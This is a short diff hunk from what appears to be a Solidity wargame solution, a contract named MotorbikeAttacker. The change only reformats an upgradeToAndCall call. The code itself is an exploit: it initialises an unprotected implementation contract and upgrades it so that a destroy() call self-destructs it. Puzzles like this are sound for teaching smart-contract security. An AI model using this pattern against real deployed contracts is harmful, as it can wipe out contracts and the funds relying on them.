@@ -9,10 +9,7 @@ contract MotorbikeAttacker {
     function attack(address _engine) public {
         Engine engine = Engine(_engine);
         engine.initialize();
-        engine.upgradeToAndCall(
-            address(this),
-            abi.encodeWithSignature("destroy()")
-        );
+        engine.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
     }
 
     function destroy() public {
